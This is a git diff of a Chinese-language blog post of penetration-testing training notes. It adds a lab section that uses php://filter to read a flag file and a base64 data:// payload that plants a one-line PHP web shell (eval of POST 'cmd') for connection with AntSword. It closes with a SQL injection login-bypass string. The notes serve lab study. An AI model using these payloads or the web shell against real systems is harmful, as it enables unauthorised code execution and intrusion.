@@ -1,6 +1,6 @@
 ---
 layout:     post
-title:      "渗透测试综合实训1"
+title:      "渗透测试综合实训合集"
 subtitle:   "终于要学到点真东西了吗"
 date:       2025-09-06 12:00:00
 author:     "hangyangjun"
@@ -8,7 +8,6 @@ header-img: "img/training.png"
 tags:
     - 笔记
     - 记录
-    - 学习
     - 实训
     - 安全
     - 渗透测试
@@ -16,6 +15,7 @@ tags:
     - Windows
     - Kali
     - Linux
+    - Web
 ---
 # 目标一
 使用 Kali 对 WinXP 系统的 SMB服务 **MS08-067漏洞** 进行利用，最终进入系统桌面进行截图
@@ -249,7 +249,52 @@ exploit/run                                           # 运行
 遇到*蓝屏*请重启Windows虚拟机。  
 成功反弹shell后的步骤同目标一
 
+//////////////////////////////////////
 
+# 目标四
+
+
+安装蚁剑 AntSword
+
+
+
+
+1. 使用 php://filter **伪协议**
+直接读取flag.php的源码（绕过 PHP 执行，以 base64 编码显示内容）：
+
+plaintext
+`php://filter/read=convert.base64-encode/resource=flag.php`
+
+
+原理：php://filter 可以对文件内容进行过滤处理，convert.base64-encode 会将flag.php的内容编码为 base64，避免被 PHP 解析执行，从而直接获取源码。
+操作：提交后，服务器会返回一串 base64 编码字符串，将其解码即可得到flag.php的内容（包含 flag）。
+
+<?php
+    header('Content-Type: text/html; charset=utf-8');
+    echo "Flag 可不会给你看哦！";
+    $flag = "CTF{example_flag_12345}";
+?>
+
+
+
+2. 在远程文件包含（RFI）漏洞实验中，利用 PHP 伪协议上传木马的核心思路是通过伪协议构造可执行的 PHP 代码。以下是常用的方法，你可以在表单的word参数中尝试输入：
+使用 data:// 伪协议直接执行 PHP 代码
+plaintext
+data://text/plain;base64,PD9waHAgcGhwaW5mbygpOz8+
+
+
+原理：data:// 协议可以直接传递数据，这里将 PHP 代码（<?php phpinfo();?>）进行 base64 编码后传输
+解码后实际执行的代码：<?php phpinfo();?>（可替换为木马代码，如一句话木马）
+替换为一句话木马的示例（<?php @eval($_POST['cmd']);?> 的 base64 编码）：
+plaintext
+`data://text/plain;base64,PD9waHAgQGV2YWwoJF9QT1NUWydjbWQnXSk7Pz4=`
+
+
+你可以用蚁剑、中国菜刀等工具连接，连接地址就是当前漏洞页面的 URL，密码是 cmd（代码中定义的 $_POST['cmd']）
+
+
+
+admin ' or '1' = '1
 
 
 
